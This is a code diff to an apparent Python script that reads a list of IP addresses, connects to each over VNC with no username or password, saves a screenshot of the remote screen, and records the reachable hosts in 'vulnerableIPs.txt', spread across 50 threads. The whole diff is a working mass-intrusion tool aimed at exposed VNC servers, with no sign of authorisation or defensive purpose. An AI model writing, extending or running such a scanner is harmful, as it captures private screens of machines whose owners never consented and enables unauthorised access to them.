@@ -1,23 +1,23 @@
 import os
-from subprocess import call
+import time
 from vncapi import api
 import os.path
 import threading
 from filelock import FileLock
 
-def parseLine(line):
-    try: 
-        client = api.connect('{ip}:0'.format(ip=parsedLine[3]),timeout=10)
-        client.captureScreen('screenshot_IP_{ip}.png'.format(ip=parsedLine[3]))
-        print('Got image from {ip}'.format(ip=parsedLine[3]))
-        with FileLock("vulnerableIPs.txt"):
-                with open('vulnerableIPs.txt', 'a') as file:
-                    file.write(parsedLine[3])
-
-    except:
-        print('Cant get image from {ip}'.format(ip=parsedLine[3]))
-        #TODO add ability to edit "open" to "close" so as to not re-read the line
-        pass
+def attemptConnect(ips):
+     for ip in ips:
+        try:
+            client = api.connect('{ip}:0'.format(ip=ip),timeout=10, username=None, password=None)
+            client.captureScreen('screenshot_IP_{ip}.png'.format(ip=ip))
+            print('Got image from {ip}'.format(ip=ip))
+            with FileLock("vulnerableIPs.txt"):
+                    with open('vulnerableIPs.txt', 'a') as file:
+                        file.write(ip)
+        except:
+            print('Cant get image from {ip}'.format(ip=ip))
+            #TODO add ability to edit "open" to "close" so as to not re-read the line
+            pass
 
 def createThread(maxThreads, ips):
         currentIndex = 0
@@ -51,11 +51,12 @@ def main():
                     print("")
             print("Done. Proceeding with screenshotting: ")
 
-            #thread = threading.Thread(target=parseLine, kwargs={'line':line})
-            #thread.start()
-            maxThreads = 2000
+            maxThreads = 50
             ips_to_multithread = createThread(maxThreads, ips)
-            print(len(ips_to_multithread))
+
+            for i in range(0, maxThreads):
+                thread = threading.Thread(target=attemptConnect, kwargs={'ips':ips_to_multithread[i]})
+                thread.start()
 
 
 if __name__ == '__main__':
